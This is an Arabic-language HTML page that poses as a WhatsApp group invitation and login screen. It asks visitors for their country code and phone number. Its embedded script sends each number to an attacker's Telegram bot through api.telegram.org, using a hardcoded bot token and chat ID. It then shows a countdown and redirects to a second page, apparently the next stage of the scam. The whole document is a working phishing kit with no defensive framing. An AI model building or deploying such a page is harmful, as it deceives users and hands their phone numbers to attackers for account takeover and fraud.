<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>الدعوة للانضمام إلى مجموعة واتساب</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #F0F4F8;
            margin: 0;
            padding: 0;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #25D366;
            padding: 15px 25px;
            color: white;
            font-size: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .navbar .logo {
            display: flex;
            align-items: center;
        }

        .navbar .logo img {
            height: 30px;
            margin-right: 10px;
        }

        .container {
            text-align: center;
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            padding: 30px;
            max-width: 400px;
            margin: 50px auto;
            animation: fadeIn 1s ease-in-out;
        }

        .container img {
            width: 120px;
            margin-bottom: 20px;
        }

        .container .title {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 15px;
        }

        .container .description {
            font-size: 16px;
            color: #555;
            margin-bottom: 25px;
        }

        .container .form-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            align-items: center;
        }

        .container select,
        .container input {
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 12px;
            font-size: 16px;
            width: 100%;
            max-width: 320px;
            margin-top: 5px;
            transition: all 0.3s ease-in-out;
        }

        .container select:focus,
        .container input:focus {
            border-color: #25D366;
            box-shadow: 0 0 10px rgba(37, 211, 102, 0.5);
            outline: none;
        }

        .container button {
            padding: 12px;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            max-width: 320px;
            transition: all 0.3s ease-in-out;
        }

        .container button:hover {
            background-color: #1DA955;
            transform: translateY(-3px);
        }

        .countdown {
            font-size: 18px;
            color: #25D366;
            margin-top: 20px;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            color: #888;
            font-size: 14px;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <!-- Navbar -->
    <div class="navbar">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
            واتساب
        </div>
    </div>

    <!-- Main Container -->
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <div class="title">تسجيل الدخول</div>
        <div class="description">الدعوة للانضمام إلى مجموعة واتساب.</div>

        <div class="form-group">
            <select id="countryCode">
                <option value="966">🇸🇦 السعودية +966</option>
                <option value="971">🇦🇪 الإمارات +971</option>
                <option value="965">🇰🇼 الكويت +965</option>
                <option value="974">🇶🇦 قطر +974</option>
                <option value="973">🇧🇭 البحرين +973</option>
                <option value="968">🇴🇲 عمان +968</option>
                <option value="963">🇸🇾 سوريا +963</option>
                <option value="964">🇮🇶 العراق +964</option>
                <option value="962">🇯🇴 الأردن +962</option>
                <option value="970">🇵🇸 فلسطين +970</option>
                <option value="249">🇸🇩 السودان +249</option>
            </select>
            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
        </div>
        <button onclick="sendMessage()">متابعة</button>
        <div class="countdown" id="countdown"></div>
    </div>

    <footer>
        ©️ 2024 واتساب
    </footer>

    <script>
        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
        const chatId = '612575358';

        function sendMessage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();

            if (!phoneNumber || phoneNumber.length < 6) {
                alert('يرجى إدخال رقم هاتف صحيح.');
                return;
            }

            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `رقم الهاتف: ${fullPhoneNumber}`
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    startCountdown();
                } else {
                    alert('حدث خطأ أثناء الإرسال.');
                }
            })
            .catch(error => {
                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
            });
        }

        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            let countdown = 10;

            const interval = setInterval(() => {
                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
                countdown--;

                if (countdown < 0) {
                    clearInterval(interval);
                    window.location.href = 'secondpage.html'; // قم بتغيير الرابط للصفحة المطلوبة
                }
            }, 1000);
        }
    </script>
</body>
</html>
